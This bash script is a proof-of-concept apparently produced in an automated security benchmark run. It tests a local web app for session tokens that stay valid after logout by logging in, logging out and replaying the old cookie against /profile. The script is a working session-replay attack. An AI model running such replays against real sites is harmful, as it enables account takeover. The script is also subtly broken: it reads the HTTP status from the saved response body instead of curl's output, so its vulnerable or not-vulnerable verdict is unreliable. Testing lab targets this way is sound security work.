#!/bin/bash
# POC: Demonstrates session persistence vulnerability where session tokens remain valid after logout. The POC logs in, obtains a session token, logs out, then verifies the old token still grants access to protected resources.
# Target: ./repo
# Created: 2025-11-10T14:44:12.183Z
# Session: benchmark-XBEN-024-24-mht8yjhk

# Session Persistence After Logout - POC
# Demonstrates that session tokens remain valid after logout
# Target: http://localhost:5000 (or configure TARGET_URL)

TARGET_URL="${1:-http://localhost:5000}"
COOKIE_JAR=$(mktemp)
RESPONSE_FILE=$(mktemp)

echo "=========================================="
echo "Session Persistence After Logout POC"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Step 1: Login to obtain a session token
echo "[*] Step 1: Logging in to obtain session token..."
LOGIN_RESPONSE=$(curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=csrftest&password=password" \
  -w "\n%{http_code}" \
  -o "$RESPONSE_FILE")

HTTP_CODE=$(tail -n1 "$RESPONSE_FILE")
BODY=$(head -n-1 "$RESPONSE_FILE")

echo "    Response Code: $HTTP_CODE"

# Extract session cookie
SESSION_COOKIE=$(grep -i "^session=" "$COOKIE_JAR" | awk -F= '{print $2}' | awk '{print $1}')
if [ -z "$SESSION_COOKIE" ]; then
    SESSION_COOKIE=$(echo "$BODY" | grep -oP 'session=\K[^;]*' | head -1)
fi

echo "    Session Cookie: $SESSION_COOKIE"
echo ""

# Step 2: Access protected resource BEFORE logout
echo "[*] Step 2: Accessing /profile BEFORE logout..."
curl -s -b "$COOKIE_JAR" -b "session=$SESSION_COOKIE" \
  -X GET "$TARGET_URL/profile" \
  -w "\n%{http_code}" \
  -o "$RESPONSE_FILE"

HTTP_CODE=$(tail -n1 "$RESPONSE_FILE")
BODY=$(head -n-1 "$RESPONSE_FILE")

echo "    Response Code: $HTTP_CODE"
if echo "$BODY" | grep -q "Profile\|csrftest"; then
    echo "    ✓ Successfully accessed profile (expected)"
else
    echo "    ! Could not access profile before logout"
fi
echo ""

# Step 3: Logout
echo "[*] Step 3: Calling /logout endpoint..."
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" -b "session=$SESSION_COOKIE" \
  -X GET "$TARGET_URL/logout" \
  -w "\n%{http_code}" \
  -o "$RESPONSE_FILE"

HTTP_CODE=$(tail -n1 "$RESPONSE_FILE")
BODY=$(head -n-1 "$RESPONSE_FILE")

echo "    Response Code: $HTTP_CODE"
echo "    Logout completed"
echo ""

# Step 4: Attempt to access protected resource AFTER logout using OLD session
echo "[*] Step 4: Attempting to access /profile AFTER logout with OLD session token..."
curl -s -b "session=$SESSION_COOKIE" \
  -X GET "$TARGET_URL/profile" \
  -w "\n%{http_code}" \
  -o "$RESPONSE_FILE"

HTTP_CODE=$(tail -n1 "$RESPONSE_FILE")
BODY=$(head -n-1 "$RESPONSE_FILE")

echo "    Response Code: $HTTP_CODE"

# Check if session is still valid
if [ "$HTTP_CODE" = "200" ]; then
    if echo "$BODY" | grep -q "Profile\|csrftest"; then
        echo "    ✗ VULNERABILITY CONFIRMED: Old session token still grants access!"
        echo "    The session was NOT invalidated server-side after logout"
        echo ""
        echo "=========================================="
        echo "RESULT: VULNERABLE"
        echo "=========================================="
        RESULT=1
    else
        echo "    Response received but content unclear"
        echo "    Response snippet: $(echo "$BODY" | head -c 100)"
    fi
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo "    ✓ Session properly invalidated (expected behavior)"
    echo "    Response Code: $HTTP_CODE indicates unauthorized access"
    echo ""
    echo "=========================================="
    echo "RESULT: NOT VULNERABLE"
    echo "=========================================="
    RESULT=0
else
    echo "    Unexpected response code: $HTTP_CODE"
    echo "    Response snippet: $(echo "$BODY" | head -c 100)"
fi

echo ""

# Cleanup
rm -f "$COOKIE_JAR" "$RESPONSE_FILE"

exit $RESULT